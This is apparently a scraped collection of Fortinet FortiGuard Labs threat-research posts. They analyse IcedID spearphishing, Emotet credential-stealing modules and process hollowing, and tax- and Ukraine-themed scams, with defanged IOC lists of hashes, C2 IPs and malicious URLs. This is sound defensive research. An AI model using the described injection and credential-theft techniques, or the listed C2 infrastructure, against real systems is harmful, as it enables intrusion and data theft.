10de515de5c970385cd946dfda334bc10a7b2d65 SHA1 Backdoor eb231f08cce1de3e0b10b69d597b865a7ebac4b3 SHA1 Backdoor 66c3dfcb2cc0dfb60e40115e08fc293276e915c2536de9ed6a374481279b852b SHA256 Loader 73640e8984ad5e5d9a1fd3eee39ccb4cc695c9e3f109b2479296d973a5a494b6 SHA256 Loader 7777bd2bdeff2fd34a745c350659ee24e330b01bcd2ee56d801d5fc2aceb858c SHA256 Loader 8bf4e301538805b98bdf09fb73e3e370276a252d132e712eae143ab58899763e SHA256 Loader 18b2e1c52d0245824a5bac2182de38efb3f82399b573063703c0a64252a5c949 SHA256 Loader d5c1a2ca8d544bedb0d1523db8eeb33f0b065966f451604ff4715f600994bc47 SHA256 ZIP 0939b68af0c8ee28ed66e2d4f7ee6352c06bda336ccc43775fb6be31541c6057 SHA256 BAT 0595a719e7ffa77f17ac254134dba2c3e47d8c9c3968cda69c59c6b021421645 SHA256 Dropper 7782fdc84772c6c5c505098707ced6a17e74311fd5c2e2622fbc629b4df1d798 SHA256 Dropper 18751e47648e0713345552d47752209cbae50fac07895fc7dd1363bbb089a10b SHA256 Driver 64-bit e4e4ff9ee61a1d42dbc1ddf9b87223393c5fbb5d3a3b849b4ea7a1ddf8acd87b SHA256 Driver 64-bit 395dbe0f7f90f0ad55e8fb894d19a7cc75305a3d7c159ac6a0929921726069c1 SHA256 Driver 32-bit befc197bceb3bd14f44d86ff41967f4e4c6412604ec67de481a5e226f8be0b37 SHA256 Driver 32-bit 1c617fd9dfc068454e94a778f2baec389f534ce0faf786c7e24db7e10093e4fb SHA256 Legitimate Synaptics Setup.exe bde7b9832a8b2ed6d33eb33dae7c5222581a0163c1672d348b0444b516690f09 SHA256 syn.exe 8b88fe32bd38c3415115592cc028ddaa66dbf3fe024352f9bd16aed60fd5da3e SHA256 syn.exe ba763935528bdb0cc6d998747a17ae92783e5e8451a16569bc053379b1263385 SHA256 syn.exe 9908cb217080085e3467f5cedeef26a10aaa13a1b0c6ce2825a0c4912811d584 SHA256 syn.exe c6bcde5e8185fa9317c17156405c9e2c1f1887d165f81e31e24976411af95722 SHA256 winmm.dll 3403923f1a151466a81c2c7a1fda617b7fbb43b1b8b0325e26e30ed06b6eb936 SHA256 Backdoor 9BCD82563C72E6F72ADFF76BD8C6940C6037516A Certificate thumbprint - 2A89C5FD0C23B8AF622F0E91939B486E9DB7FAEF Certificate thumbprint - 192.95.36[.]61 Network - vpn2.smi1egate[.]com Network - svn1.smi1egate[.]com Network - giga.gnisoft[.]com Network - giga.gnisoft[.]com Network - 104.223.34[.]198 Network - 103.224.80[.]76 Network - hxxp://104.223.34[.]198/111.php Network - hxxp://104.223.34[.]198/1dll.php Network - hxxp://104.223.34[.]198/syn.php Network - hxxp://104.223.34[.]198/p.txt Network - msupdate2 Service name - WebService Service name - alg Service name - msupdate Service name - msupdateday Service name - DigaTrack Service name - crtsys.sys File name - %APPDATA%\\syn.exe File name - %APPDATA%\\newdev.dll File name - Learn more about Fortinet’s FortiGuard Labs threat research and intelligence organization and the FortiGuard Security Subscriptions and Services portfolio ."
            }
        },
        {
            "https://www.fortinet.com/blog/threat-research/spoofed-invoice-drops-iced-id": {
                "metadata": {
                    "dateAccessed": "2022-04-03",
                    "dateCreated": "2022-03-28",
                    "source": "www.fortinet.com"
                },
                "text": "FortiGuard Labs Research Thanks to Val Saengphaibul and Fred Gutierrez who helped contribute to this blog. Affected Platforms: Windows Impacted Users: Windows users Impact: Compromised machines are under the control of the threat actor Severity Level: Medium Spearphishing crafted with industry-specific terms derived from intelligence gathering techniques to trick a recipient into opening a file is especially difficult to identify. This is especially true when an adversary has knowledge of how a business works and the processes that underpin it. Using this knowledge, a lure can be crafted that takes advantage of these day-to-day processes – for example, settling the cost of a fuel transaction. FortiGuard Labs recently encountered such a scenario, where a fuel company in Kyiv, Ukraine received a spearphishing e-mail that contained an attached invoice—seemingly from another fuel provider—that was spoofed. The attachment is a zip file that contains the IcedID Trojan. IcedID has been observed as far back as 2017. Its primary function is to steal banking credentials and personal information. It is also capable of deploying additional malware from the same group or partner organizations. This instance also uses an interesting deployment method. It uses the ISO format, which is mounted automatically as a disk in Windows. ISO files can also be used to create bootable CD-ROMs or install an operating system or virtual machine. It also contains a LNK (shortcut file) used to launch a DLL (Dynamic-link Library). This blog details the infection process and subsequent malware deployment by the threat actors behind IcedID. The Phishing E-mail The e-mail originated from an IP address in Belize, at 179[.]60[.]150[.]96. It spoofs the originating e-mail address to appear to have been sent from another fuel provider in Ukraine. The e-mail contains both English and Ukrainian elements and looks realistic given the mention of extra security measures regarding the attachment. Attached to the e-mail is a file named “invoice_15.zip”. Extracting the Zip file will drop “invoice_15.iso” and begin the first phase of infection. ISO Windows is capable of mounting iso files as external disks. Doing so will present the user with a shortcut called “document.” In most cases, the file extension will be hidden from the user, making it appear as an actual document. When the full contents of the iso container are revealed, a DLL file can also be seen. LNK As seen in Figure 4, the shortcut file was created some time prior to the sending of the phishing e-mail. Additionally, the highlighted area shows what will occur should the shortcut be clicked on by a user. In this case, Regsvr32 is used to register “main.dll” with the Windows registry and launch the code contained within. This action begins the next phase of infection. Dropper “main.dll” acts as a dropper for IcedID. Static analysis of the file reveals an interesting point. What at appears at first glance to be an easy win for IOCs (Indicators of Compromise) because it contains a domain and IP address, turns out to be slightly more complicated. In comparing the area of code where the strings in Figure 5 are stored, we find that this area is not called by any functions within “main.dll”. To illustrate this, the right-hand side of the very first line in Figure 6 contains “Data XREF:”. This indicates that it is referenced elsewhere in the code. The strings from Figure 5, however, do not include this information, indicating they are not. By investigating further, the story becomes even more interesting. This code appears in a StackOverflow question from approximately 10 years ago concerning an issue about downloading an image over HTTP ( https://stackoverflow.com/questions/9389183/downloading-a-picture-with-http-get-only-downloads-a-small-part-of-it ). It should be noted that there is no malicious intent with the content of that posting. That it is now part of “main.dll” indicates it is a decoy for analysts in the hope the actual indicators won’t be blocked. As can be seen in Figure 7, once running, the malware uses several Windows command-line tools to obtain information about the local environment. These include capturing the local IP address (ipconfig), enumerating domain trusts (nltest), and capturing a list of domain administrators (net group), among others. The sample then tries to communicate outbound to a command and control (C2) server. There are multiple addresses the malware can connect to in the event one of the destinations becomes unavailable. If a connection to a C2 server has been made, the malware then moves to ensure persistence. It installs a copy of itself in the user’s temp directory, “%APPDATA%\\local\\temp”. Conclusion Threat actors that are knowledgeable of their targets are able to increase their chances of installing an implant within an organization. Based on our observations, the efforts used in this IcedID attack highlight the groups methodical effort, as evidenced by their research of Ukraine's retail fuel industry. Additionally, the use of uncommon deployment methods (zipped ISO file) to establish a foothold—and ultimately gain persistence within an organization—reveals how crafty the threat actors are able to be to obtain unauthorized access. Fortinet Protections All IcedID samples mentioned in this blog are detected by the following (AV) signatures: W32/Kryptik.HOTN!tr W64/Kryptik.CXY!tr W64/Kryptik.CXY!tr W64/Kryptik.CXY!tr LNK/IceID.AW!tr W64/Kryptik.CXY!tr All network based URI’s are blocked by the WebFiltering client. Fortinet has multiple solutions designed to help train users to understand and detect phishing threats: The FortiPhish Phishing Simulation Service uses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. In addition to these protections, we suggest that organizations also have their end users go through our FREE NSE training : NSE 1 – Information Security Awareness . It includes a module on Internet threats that is designed to help end users learn how to identify and protect themselves from various types of phishing attacks. IOCs Filename SHA256 invoice_15.zip 83bd20009107e1f60479016046b80d473436d3883ad6989e5d42bc08e142b5bb invoice_15.iso 3542d5179100a7644e0a747139d775dbc8d914245292209bc9038ad2413b3213 document.lnk a17e32b43f96c8db69c979865a8732f3784c7c42714197091866473bcfac8250 main.dll 698a0348c4bb8fffc806a1f915592b20193229568647807e88a39d2ab81cb4c2 Arur.exe 283d5eea1f9fc34e351deacc25006fc1997566932fae44db4597c84f1f1f3a30 Network IOCs: 160[.]153[.]32[.]99 160[.]90[.]198[.]40 yourgroceries[.]top ssddds1ssd2[.]com ip-160-153-32-99[.]ip[.]secureserver[.]net Learn more about Fortinet’s FortiGuard Labs threat research and intelligence organization and the FortiGuard Security Subscriptions and Services portfolio ."
            }
        },
        {
            "https://www.fortinet.com/blog/threat-research/ms-office-files-involved-again-in-recent-emotet-trojan-campaign-part-ii": {
                "metadata": {
                    "dateAccessed": "2022-04-03",
                    "dateCreated": "2022-03-23",
                    "source": "www.fortinet.com"
                },
                "text": "Affected platforms: Microsoft Windows Impacted parties: 64-bit Windows Users Impact: Controls a victim’s device and collects sensitive information Severity level: Critical Fortinet’s FortiGuard Labs recently captured more than 500 Microsoft Excel files involved in a campaign to deliver a fresh Emotet Trojan onto the victim’s device. Emotet, known as a modular Trojan, was first discovered in the middle of 2014. Since then, it has become very active, continually updating itself. It has also been highlighted in cybersecurity news from time to time. Emotet uses social engineering, like email, to lure recipients into opening attached document files (including Word, Excel, PDF, etc.) or to click links within the content of the email that downloads the latest Emotet variant onto the victim’s device and then executes it. In Part I of this post , I explained how this variant of Emotet is spread by malicious VBA code in Excel documents, how the downloaded Emotet malware runs within a Rundll32 program, what kind of anti-analysis techniques this variant uses., how it encrypts and submits its victim’s data to its C2 server., what Emotet does when it receives response data from the C2 server, and what Emotet does to enable persistence on the victim’s device. In this post, you will learn what the data in response packets with malicious modules look like, what modules have been received from the C2 server for the current Emotet campaign, and how they are deployed in the victim’s device. You will also discover what sensitive data those modules steal from a victim’s device. When X.dll Receives a Response with a Module Once the C2 server has processed and detected the first submitted packet that includes critical data—such as the victim’s device system version, Windows architecture, etc.—it replies with malicious modules for Emotet to execute in the victim’s device. All the received modules are fileless. That is, they only exist in memory and are processed by the X.dll (the core of Emotet) running in Rundll32.exe. Figure 1.1 is a screenshot of X.dll’s code and memory. The bottom is a C2’s response packet, just decrypted in memory by calling a function of 10012371. Referring to Figure 5.3 in part I of this series will help you understand the structure of the packet. The box marked in red is the verification data (99 DE … DD A5), a signed hash of the rest data of the packet. The following dword, 0x00000000, marked in yellow, is a flag that tells Emotet how to run the replied module. 0x00 tells it to execute the module in a newly-created thread. The binary block in blue is the module. It starts with the module size, 0x79400 in this example, and the rest part is the module binary data (4D 5A 90 00 …). Emotet has to verify the decrypted data, as shown in Figure 1.1, using the 40H verification data. It then deploys the received module into memory and prepares to execute it. It then calls its entry point in a newly created thread. This post will refer to this module as a “thread-module.” Its primary purposes are to extract and execute the final functional module that steals sensitive data from the victim’s device and to submit the stolen data to its C2 server, which will be discussed later in this analysis. Figure 1.2 shows where the thread function ASM code calls the entry point of the deployed thread-module. Thread-Module — Performs Process Hollowing The thread-module proceeds to decrypt a PE file, the final functional module, from its .text section into memory. To execute this module, it performs process hollowing. It does this by copying a Windows file, “certutil.exe”, from either “%Windir%\\SysWOW64\\certutil.exe” or “%Windir%\\system32\\certutil.exe” into the “%temp%” folder. It then renames it to a random file name, like “uvbubqj.exe”. Next, the thread-module creates a suspended process with this file. As you may see in the command line string in Figure 2.1, “uvbubqj.exe” is the copied “certutil.exe”, “/scomma” and the subsequent temporary file —“C:\\Users\\Bobs\\AppData\\Local\\Temp\\60B2.tmp” — are the parameters for the process. The temporary file name is generated by calling the API GetTempFileNameW(). The path of the temporary file “60B2.tmp” is read by the functional module and used to save stolen information. The sixth argument to CreateProcessW() is 0x00000004, which is a creation flag indicating “CREATE_SUSPENDED” with which CreateProcessW() creates a process and enters suspended status. It then calls a group of APIs, like GetThreadContext(), VirtualAllocEx(), ReadProcessMemory(), WriteProcessMemory(), and so on, to inject the final functional module into the new process’  memory. The API SetThreadContext() is called later to set the new process EIP register pointing to the entry point of the functional module, which is invoked after calling the API ResumeThread(). Afterward, the thread-module starts to monitor the temporary file in a loop until it is created with the stolen information from the victim’s device. Looking at the Functional Modules In the above analysis, I explained how a C2 module is loaded and executed in the victim’s device. The C2 server can return many modules, each going through the same process as described above. They will have a thread-module, run in their thread, and perform their own process hollowing. I received three C2 modules. I will elaborate on how they work on the victim’s device in the following sections. Module1 - Stealing Credentials from a Victim’s Browsers A Self-Extracting packer protects this module. It decrypts a PE file when it runs, overrides the existing code of “certutil.exe”, and then gets it executed. The unpacked PE file is a freeware called “WebBrowserPassView” developed by NirSoft. It was designed as a password recovery tool but has been abused by malicious actors to steal the victim’s credentials. A user interface displays the saved credentials stored within several web browsers. Figure 3.1 shows what this module looks like when I open it in my test environment. This Emotet variant uses WebBrowserPassView v2.06. Its thread-module passes command line parameters like “/scomma C:\\Users\\Bobs\\AppData\\Local\\Temp\\7B3C.tmp” to the process, which can switch WebBrowserPassView to a No-Window mode and save the retrieved credentials to a given temporary file. From its code, I learned it could collect the credentials from a variety of web browsers: Microsoft IE, Microsoft Edge, Google Chrome, Mozilla Firefox, Opera, Apple Safari, SeaMonkey, Yandex, Vivaldi, Waterfox, and all other Chromium-based browsers. The stolen credentials contain the following information: • URL: The URLs that credentials are saved for • Web Browser: The browser name that holds the credentials • User Name, Password: The credentials • Password Strength: Strong or weak • User Name Field: The control name type into the user name field • Password Field: The string entered in the password field • Created Time: When it was saved • Modified Time: Time when credentials were updated • Filename: What file it has stolen the credentials from All the credentials are saved in a temporary file. Module2 - Stealing Email Contact Information This module steals its victim’s email contacts from their email folders inside Microsoft Outlook by going through the victim’s emails one by one. It keeps the gathered contact information in a doubly-linked chain structure. Figure 4.1 shows one email contact obtained from an email within my test Outlook account that was then added into the doubly-linked chain, as shown at the bottom. The collected data shows the Person name and Email address of the email sender. In this example, it collected “Outlook” and “outlook@email2.office.com” from the displayed email message. This module enumerates all collected emails and puts the unique email contact information into the doubly linked chain. To collect Outlook’s data, it has to call several APIs, including MAPIInitialize(), MAPILogonEx(), and MAPIFreeBuffer(), as well as create some COM objects by calling the API CoCreateInstance(), such as OlkAccountManager and OlkMail. Finally, it retrieves those email contacts from the linked chain one by one and saves them into the temporary file that comes from the command line parameter. Figure 4.2 shows a screenshot of the temporary file, “%temp%\\6827.tmp” in this example, along with the collected email contacts. Module3 - Stealing Account Settings of Victim’s Email Clients This functional module focuses on stealing its victim’s email account settings and the credentials from their email clients. It is also a packer-protected module, so it does the same thing as Module1 when its entry point is called. According to my analysis, the unpacked PE file is an EXE file that is another freeware from NirSoft called “ Mail PassView ”. It was originally designed as a small password recovery tool for email clients. Emotet is using the latest version—v1.92. Figure 5.1 is a screenshot of this software running on my test environment. Going through its code and constant strings, we learned it could obtain email account settings and credentials from the following email clients or other clients that could save email credentials: Mozilla Thunderbird, Eudora, Microsoft Outlook, Microsoft Outlook Express, Windows Mail, MSNMessenger, Windows Live Mail, Group Mail, IncrediMail, Yahoo! Mail, Yahoo! Messenger, Hotmail, Google Desktop, and Google Talk. It collects the settings and credentials from both the system registry and the local configuration files of these email clients. Figure 5.2 is a segment of the ASM code from a common function that has predefined many value names. The software repeatedly reads User Name, Server Address, Server Port, and similar information from the system registry through these value-names under the subkeys \" HKCU\\Software\\Microsoft\\Internet Account Manager\\Accounts \" and \" HKCU\\Software\\Microsoft\\Office\\Outlook\\OMI Account Manager\\Accounts \", which are the places to save the settings and credentials for Microsoft Outlook and Microsoft Outlook Express. This time, the command line parameter string to this software is \"/scomma C:\\Users\\Bobs\\AppData\\Local\\Temp\\8042.tmp\", where \"/scomma\" allows the process to run without a window and save the retrieved information to the temporary file followed. Thread-Module – Submit Stolen Data With the functional modules working to steal sensitive data, the thread-module keeps monitoring the temporary file until it is created with the stolen information. It then loads the stolen data from the temporary file to memory and then deletes the file. Before submitting the stolen data to the C2 server, it compresses the data and encrypts it. This example, shown in Figure 6.1, is where it was about to call the API BCryptEncrypt() to encrypt the packet, which begins from 4790E0. The section outlined in red is like the packet header. It contains the packet type (0x3EA) that tells the C2 server what kind of data is in the packet, a sha256 hash code (69 35 … 3C 4A) of the data, a module ID (0x14), as well as the Victim’s ID. The subsequent data, marked in blue, starts with a data size (0x398) of the following data (from 10 55 52 4C … to the end), which are the compressed web browser credentials. This thread-module uses eleven C2 servers to receive data stolen from the victim’s device. The IP and Ports of these C2 servers are encrypted in memory and get decrypted before submitting the stolen data. The three downloaded modules have the same C2 server list, which can be found in the “IOC” section at the end of this analysis. Figure 6.2 is a screenshot of a proxy tool showing how the packet with the stolen victim’s sensitive data is sent to its C2 server. It uses the HTTP Post method with a randomized URL to submit the stolen data in the body, which consists of a 40H-long exported key at the beginning with the encrypted data following, as shown in Figure 6.2. The C2 server can decrypt the submitted data using the 40H exported key. Conclusion In Part II of this analysis, I started with a received module packet from a C2 server and explained the structure of the packet. Next, I showed how the module (thread-module) is executed in a newly created thread. We then walked through how the thread-module performs process hollowing to execute the functional modules. In discussing the three received modules, I elaborated on what kind of data Emotet can steal from the victim’s device, such as email contact information from the victim’s email account, the email account’s settings, credentials from the victim’s email client, and credentials saved in a wide range of web browsers. Finally, going back to the thread-module, Emotet reads the stolen information from the given temporary files. It then compresses and encrypts the data, which is ultimately submitted using the HTTP Post method to the C2 server. Fortinet Protections Fortinet customers are already protected from this malware by FortiGuard’s Web Filtering, AntiVirus, FortiMail, FortiClient, FortiEDR, and CDR (content disarm and reconstruction) services, as follows: The malicious Macro inside the Excel sample mentioned in Part I of the post can be disarmed by the FortiGuard CDR (content disarm and reconstruction) service. All relevant URLs have been rated as \" Malicious Websites \" by the FortiGuard Web Filtering service. The captured Excel sample and the downloaded Emotet dll file are detected as \" VBA/Emotet.2826!tr.dldr \" and \" W32/Emotet.B185!tr \" and are blocked by the FortiGuard AntiVirus service. FortiEDR detects both the Excel file and Emotet dll file as malicious based on its behavior. In addition to these protections, Fortinet also provides multiple solutions designed to help train users in detecting and understanding phishing threats: We encourage organizations to have their end users take our FREE NSE Training : NSE 1 – Information Security Awareness . It includes a module on Internet threats designed to help end-users learn how to identify and protect themselves from various types of phishing attacks. This training can then be reinforced using our FortiPhish phishing simulation service. It uses real-world attack scenarios to train users, test awareness and vigilance, and reinforce proper practices for handling phishing incidents. IOCs C2 Server List in the three thread-modules: 144[.]217[.]88[.]125:443 67[.]205[.]162[.]68:8080 54[.]36[.]98[.]59:7080 45[.]184[.]36[.]10:8080 47[.]110[.]149[.]223:8080 159[.]65[.]1[.]71:8080 51[.]178[.]186[.]134:443 131[.]100[.]24[.]199:8080 51[.]91[.]142[.]158:80 51[.]79[.]205[.]117:8080 176[.]31[.]163[.]17:8080 Learn more about FortiGuard Labs global threat intelligence and research and the FortiGuard Security Subscriptions and Services portfolio."
            }
        },
        {
            "https://www.fortinet.com/blog/threat-research/bad-actors-capitalize-current-events-email-scams": {
                "metadata": {
                    "dateAccessed": "2022-04-03",
                    "dateCreated": "2022-03-23",
                    "source": "www.fortinet.com"
                },
                "text": "Many thanks to Fred Gutierrez and Geri Revay for their contributions to this blog. FortiGuard Labs Research Affected Platforms: Windows Impacted Users: Windows users Impact: Compromised machines are under the control of the threat actor. Stolen personally identifiable information (PII), credential theft, monetary loss, etc. Severity Level: Medium Malicious email and phishing scams are usually topical and follow a pattern of current events. They are usually crafted around calendar and/or trending issues as attackers realize that victims are interested in all things relevant to the moment. Threat actors are aware that not all recipients will bite, but some will, hence the origination of the term “phishing.” Threat actors often put in the least amount of work possible for a maximum return, sending out phishing emails to thousands of targets. Even if less than one percent of victims respond, the return on investment is still significant due to the gain of personally identifiable information (PII) and/or establishing a foothold within an organization using stolen credentials, malware, or other means. This blog highlights some examples we’ve encountered that may help users better spot suspicious emails. Recent examples observed by FortiGuard Labs include emails related to tax season and the Ukrainian conflict, which reflect the timeliness of current and newsworthy events at the time of writing. Tax Season Scams Tax season comes around annually, like other seasonal events or holidays. Targeting calendar-based events enables threat actors to prepare ahead of time and have a new selection of targets on rotation. The following set of examples highlights two IRS/tax-themed scams.  The first is a malicious email pretending to originate from the U.S. Internal Revenue Service (IRS) containing a maliciously crafted Microsoft Excel file to deliver malware (Emotet). The second is a phishing scam that asks a recipient to send personally identifiable information (PII) via written correspondence to a phone number. IRS-themed email delivering Emotet This attack starts with an IRS impersonation email that contains a ZIP attachment called “W-9 form.zip”. The email is sent to the target, and a password is provided within the body of the email for convenient extraction. The zipped attachment contains a file, “W-9 form.XLM.” The XLM extension is simply an Excel file that contains Excel 4.0 macros: For those not familiar with Form W-9 (Request for Taxpayer Identification Number and Certification), it is used by U.S. individuals to provide a correct taxpayer identification number (TIN) to payers (or brokers) who are required to file information returns with the IRS. Red flags that this is a phishing scam include the non-capitalization of “assistant” and the incorrect usage of “Treasure” instead of “Treasury” in the signature body. It should also be noted that the IRS does not communicate with U.S. taxpayers via email and instead uses the traditional postal service for all communications. Analysis Upon observation, and in a similar fashion to our recent Emotet blog , the XLM file asks the user to enable macros upon opening the file. The XLM file contains the following obfuscated Excel 4.0 macro: The document contains five hidden sheets: \"Vfrbuk1\", \"Sheet\", \"Lefasbor1\", \"EFALGV\", “Je1” and “Je2”. Sheet EFALGV contains the main code, which uses the other sheets to compile commands. It does this without user interaction, performing its behind-the-scenes magic to download a copy of Emotet from multiple remote locations: Another variation observed was sent to a State Attorney General’s office in the United States. The “From” address is clearly seen in the email. It was sent from an automotive tire shop located in Japan, which is most likely compromised and serves as an open mail relay: Microsoft takes action Microsoft announced in January 2022 that Excel 4.0 macros are disabled by default starting in Excel (Build 16.0.14427.10000). The move came as no surprise because the feature is continuously abused by threat actors. Other welcome news from Microsoft is the restricted usage of macros in Access, Excel, PowerPoint, Visio, and Word by default starting in April 2022 via the disablement of VBA macros (also abused by Emotet). Based on the examples shown above, we can see this did not deter the attacker one bit from abusing Excel 4.0 macros. Also, administrators are able to control the usage of Excel 4.0 macros via group policy settings, as well as cloud and ADMX policies. This feature was introduced in July 2021. For more details, please visit Microsoft’s tech community page - “ Restrict usage of Excel 4.0 (XLM) macros with new macro settings control ”. It’s important to note that these potential victims were not targeted. Emotet utilizes what is colloquially known in the industry as a “spray and pray” tactic to spread via malicious email campaigns. Emotet is known to have delivered other malware variants in the past, with the most disruptive being ransomware. Some ransomware as a service (RaaS) groups have specific policies to not deploy ransomware to government sectors, defense industry, and other critical infrastructures (hospitals, etc.). However, actual attacks are often carried out by RaaS affiliates who may or may not abide by the policy set by RaaS groups. Request to fill and send a W-8 form via a fax number A different scam recently observed is an email with the subject line of: “NEW YEAR-NON-RESIDENT ALIEN TAX EXEMPTION UPDATE.” This example contains an attachment, titled “W8-ENFORM.PDF.” While not malicious, this PDF file is essentially a photocopy of the IRS W-8 form. It is simply the W8 form from the IRS with an appended number added by the bad actors at the end of the document. Red flags within the body of the email are the improper usage of grammar, typos, and punctuation: This scam uses social engineering verbiage to target nonresident aliens of the United States based on “official” records discovery. However, in a weird miscue, the email contains a contradictory statement: “if you are a USA citizen and resident, this W8BEN-FORM is not meant for you…” The email continues with instructions to reply back and to state on the attached form that the recipient is, indeed, a U.S. citizen/resident. After this step is completed, the bad actor provides a different form to complete. Once this form is filled out, all PII included on this form appears to be sent to an 806 phone number, which is the area code for the state of Texas. As of the time of writing this number has an active fax service, which most likely is internet-based and can receive the content and distribute as an attachment to the malicious actor anywhere in the world. It is possible, if there are a lot of respondents, they could be using OCR (Optical Image Recognition) image technology to store victim data in a database for later use. It is important to again note that the IRS does not handle any official correspondence via email. Official W-9 forms are available on the IRS Web page . Official W8 forms can be found here . Refugee war scams Spam commonly uses techniques such as current events (sports, tax season), using money as an incentive to click, playing on our natural greed (tax refunds, free money) and use the threat of running out of time to get us to take immediate action. In the example below,  all three techniques are employed, albeit in a more unusual way – with an impassioned plea give money to others with the subject line “URGENT RESPONSE REQUIRED! (UKRAINE).” While the email does not contain a malicious attachment or link, the scammer is asking for a response. This is likely to contain a follow up message for further information. Perhaps the threat actor may engage in dialog with the victim and will ask the victim to send payment via wire transfer, third-party payment processors (such as Venmo, Zelle, etc.), or via cryptocurrency. The email address of the sender uses a gmail.com email address to likely evade spam filters. Bitcoin Variation The screenshot below highlights a brazenly opportunistic scam with the subject line “URGENT DONATION RESPONSE FOR WAR REFUGEE CAMP IN UKRAINE.” It purports to originate from a trusted organization, The United Nations. Red flags are the forged email address of the UN High Commissioner “info@seca[.]cam” in the “From” line, as well as some grammatical and punctuation errors. Another red flag is that the seca[.]cam domain was only registered a few weeks ago, on February 23, 2022. Checking the Bitcoin wallet address, we can see that this is an active wallet that had its first transaction on September 29 th, 2021. Since the first discovery of the campaign on the 7 th of March, several transactions have been made to this wallet. Its current value at time of writing is $46.82 USD, with total transactions valued at $712.79 USD. Assuming that this wallet was used for malicious purposes, it appears that various campaigns have netted the threat actor a modest profit. However, it can also be safely surmised that this might not be the scammers only wallet. As with the IRS, it is also important to mention is that the U.N. will never send unsolicited emails for donations.  For further details, please reference the U.N. Fraud Alert page. Conclusion Emotet and the War in Ukraine With the current tragic situation in Ukraine unfolding, internal chatter within ransomware groups have surfaced. Some ransomware groups side with Russia and other groups side with the West. A well-known RaaS group (which used Emotet)—that we will not publicize for obvious reasons—has made a very strong statement that any attacks directed towards Russia will be met with a retaliatory act towards the West. As the situation is fluid, and with potentially compromised government sectors likely being infected or targeted with ransomware at this very moment either for monetary or political reasons, this threat is not out of the question. The point is that important sectors such as government agencies are no longer exempt from attacks, especially from Emotet threat actors, regardless of bias or opinion. Phishing scams aren’t going anywhere. They are a part of the threat landscape and will likely always be a component of an attackers’ arsenal. This is because the return on investment for an attacker is very high. A crafted email containing specific language designed to trick users into opening an attachment, following a link, responding with confidential or sensitive information, etc. will always work on a percentage of targets. This is because of the one major weakness security software cannot address: the human element. Training programs constantly remind and teach users how to spot malicious email/phishing/spearphishing scams for a good reason. Out of thousands of recipients, it only takes a few to respond to make it all worthwhile to an attacker. And when the right person falls prey it can unleash a trove of information to the attacker that can be exploited for various purposes. Although such scams are well known and publicized, they are still pervasive for one simple fact—they work and will continue to work for the foreseeable future. Things to Consider: Think twice when enabling macros (they are disabled by default for good reason) especially in tax form XLM files. The IRS will never send correspondence via email (including attachments) without first obtaining your consent. IGNORE all unsolicited emails purporting to be from the IRS as they are not real. The IRS has a dedicated webpage to report scams along with an FAQ page - Report Phishing | Internal Revenue Service (irs.gov) (Note: Scams mentioned in this blog have been sent to the IRS before publication) The UN will also never send unsolicited emails for donations. According to the UN website, “The United Nations strongly recommends that the recipients of solicitations, such as those described above exercise extreme caution in respect of such solicitations” Please see the U.N Fraud Alert page for further details. IGNORE all unsolicited emails purporting to be from the UN as they are not real. (Note: Scams mentioned in this blog have been sent to the UN before publication) Unsolicited emails asking for donations of any kind via email (especially via cryptocurrency) is a red flag regardless of cause. Responding to any email (even if it doesn’t contain a link or malicious attachment) from an untrusted sender will validate your email address to threat actors, either adding you to spam lists or subjecting to future attacks and scams. Remember: Threat actors are playing the numbers game. If they spam out 1,000 emails at a very minimal cost, and 10 people bite giving them valuable data, then the effort spent was well worth the return on investment. Fortinet Coverage Fortinet customers are protected from this campaign by FortiGuard Web Filtering, AntiVirus, FortiMail, FortiClient, FortiEDR, and CDR (content disarm and reconstruction) services, as follows: The malicious macro inside the Excel sample (Emotet) can be disarmed by the FortiGuard CDR (content disarm and reconstruction) service. FortiEDR detects both the Excel file and Emotet-related files as malicious based on behavior. All relevant URIs to campaigns mentioned in the blog are blocked by the FortiGuard Web Filtering service. The malicious Excel sample and associated downloaded files are detected as: “XML/Dloader.802!tr, “W32/Emotet.C!tr\", “W32/Emotet.CV!tr”, and “W32/Emotet.1150!tr” are blocked by the FortiGuard AntiVirus service. The IRS phishing email targeting nonresident aliens is detected as: IRS PDF/Fraud.10F1!phish Ukraine Related Scams URGENT RESPONSE REQUIRED! (UKRAINE) campaign ecres231[.]servconfig[.]com Is classified as a spam server and is blocked by our Web Filtering client. URGENT DONATION RESPONSE FOR WAR REFUGEE CAMP IN UKRAINE campaign seca[.]cam is classified as a spam sender and is blocked by the Web Filtering client. Fortinet has multiple solutions designed to help train users to understand and detect phishing threats: The FortiPhish Phishing Simulation Service uses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. In addition to these protections, we suggest that organizations also have their end users go through our FREE NSE training : NSE 1 – Information Security Awareness . It includes a module on Internet threats that is designed to help end users learn how to identify and protect themselves from various types of phishing attacks. Indicators of Compromise URLs (Emotet) hxxp://piajimenez.com/Fox-C/dS4nv3spYd0DZsnwLqov/ hxxps://getlivetext.com/Pectinacea/AL5FVpjleCW/ hxxp://inopra.com/wp-includes/3zGnQGNCvIKuvrO7T/ hxxp://biomedicalpharmaegypt.com/sapbush/BKEaVq1zoyJssmUoe/ hxxp://janshabd.com/Zgye2/ hxxps://justforanime.com/stratose/PonwPXCl/ Sample SHA-256 involved in the attack: (Emotet) e5a1123894f01197d793d1fe6fa0ecc2bf6167a26ec56bab8c9db70a775ec6bc 6fa0c6858688e1c0cbc9072c9d371f2183e0bf0c30a1187453cbbe080e0167ca 06ac89a138858ed0f5eb5a30a43941b67697f8a3b47106170d879f3d51bc0e8d 9f2686b83570b7940c577013d522b96ba19e148dac33b6983267470be6a6064b 4c0ae17817c218c4b7973670f0458978efac4e6a67d1ec3abfb11ab587560d49 0758b3cde229886a039202120cda4485426c56eed3596be75fbce0d38986bf03 9a40dfc271fa3adf20e76cb6f7a27036c77adbe9882a8ef73bc977a0ea9c36ff feec12c64c8bf47ae20dc197ac1c5f0c087c89e9a72a054ba82a20bf6266b447 50351e6d541f57fccb0261514acb43cb905e4f6dde7e8716ce1b82df7d3c4867 91795e5b49eabd94c9d8b70067f68f45f9bf56e36ec9d3529576e13569074113 8ac29489154a4c39e74070063ce71bfada00cd9883466c1e28cd1e66cab1b56c 7d4897d33893f0835a982424af2f3eb77463dad1ef96fcb4021eaf15fd28c9e9 64d3d585c41577b0cfa2f9c63035a95ac785f9b5aeefeaba2490110c84aa7d00 809c990279928640c23ecc27d134f73967c7ec7269e90bb8d916f9e35b69654f 7536ed21e14ee026424d9c07edbcecb59706129d31f6be4e8788edd904df6a20 